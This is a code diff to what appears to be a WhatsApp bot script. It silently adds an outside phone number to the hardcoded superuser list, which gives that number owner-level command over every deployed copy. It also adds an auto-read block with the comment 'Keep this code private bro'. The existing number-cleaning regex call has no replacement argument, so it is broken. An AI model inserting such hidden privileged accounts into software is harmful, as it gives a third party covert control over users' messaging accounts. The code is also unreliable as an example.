@@ -161,7 +161,8 @@ setTimeout(() => {
             const dj3 = "254795900001";
             const luffy = '254795900001';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            let goat = "254742063632";
+            const superUserNumbers = [servBot, goat, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -249,6 +250,14 @@ function mybotpic() {
                 mybotpic
             
             };
+
+            // I added auto read messages here... Keep this code private bro 👊 
+            
+if (origineMessage === auteurMessage && conf.Re === "yes") {
+
+zk.readMessages([ms.key]);
+            }
+
 
 
             /************************ anti-delete-message */
